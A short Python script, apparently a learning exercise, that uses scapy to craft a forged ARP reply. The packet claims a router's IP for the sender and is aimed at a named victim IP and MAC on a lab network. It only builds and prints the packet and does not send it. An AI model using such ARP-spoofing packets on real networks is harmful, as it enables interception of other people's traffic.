#!/usr/bin/python3

import scapy.all as scapy

# pdst= client ip, hwdst= cleint mac addr, psrc= router ip 
arp_respond = scapy.ARP(op=2,pdst="192.168.253.146",hwdst="00:0c:29:ca:43:0e",psrc="192.168.253.2")
#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")

print (arp_respond.show())
print (arp_respond.summary())
